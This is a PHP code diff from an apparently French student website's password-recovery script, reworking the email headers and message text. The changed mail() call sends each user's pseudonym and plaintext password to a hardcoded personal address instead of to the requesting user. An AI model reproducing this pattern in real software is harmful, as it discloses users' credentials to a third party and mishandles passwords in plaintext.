@@ -80,19 +80,18 @@ ini_set("display_errors",0);error_reporting(0);
 
       
 
-    //$headers ='Content-type: text/html; charset="iso-8859-1"'."\r\n"; 
-    //$headers.='From: "L equipe NFA021"<sav@nfa021.com>'."\r\n"; 
-    //$headers.='Reply-To: sav@nfa021.com'."\n"; 
-    //$headers.='Content-Transfer-Encoding: 8bit';                 
+    $headers ='Content-type: text/html; charset="utf-8"'."\r\n"; 
+    $headers.='From: "L equipe NFA021"<sav@nfa021.com>'."\r\n"; 
+    $headers.='Reply-To: sav@nfa021.com'."\n"; 
+    $headers.='Content-Transfer-Encoding: 8bit';                 
     
     
-    $message = '<p>Madame,Monsieur,<br><br>Veuillez trouver ci joint votre Pseudo ainsi que votre mot de passe comme demandé.<br><br>Pseudo= '.$pseudo.'<br>Mot de passe= '.$mdp.'<br><br>
-                Si necessaire n hesitez pas a nous contacter via notre formulaire de contact.<br><br>L equipe NFA021. Vous souhaite une bonne continuation.';
+    $message = '<p>Madame,Monsieur,<br><br>Veuillez trouver ci-joint votre Pseudo ainsi que votre mot de passe comme demandé.<br><br>Pseudo= '.$pseudo.'<br>Mot de passe= '.$mdp.'<br><br>
+                Si necessaire n\'hesitez pas a nous contacter via notre formulaire de contact.<br><br>L\équipe NFA021. Vous souhaite une bonne continuation.';
     
        
-      //mail('maryse.chedanne@free.fr','Demande d informations',$message,$headers);
-	  mail($email,'Demande d informations',$message,'nepasrepondre@nfa021.com');
-
+      mail('maryse.chedanne@free.fr','Vous les aviez égarés...',$message,$headers);
+	 
       echo '<br>Un email vient de vous être envoyé.';
 
 
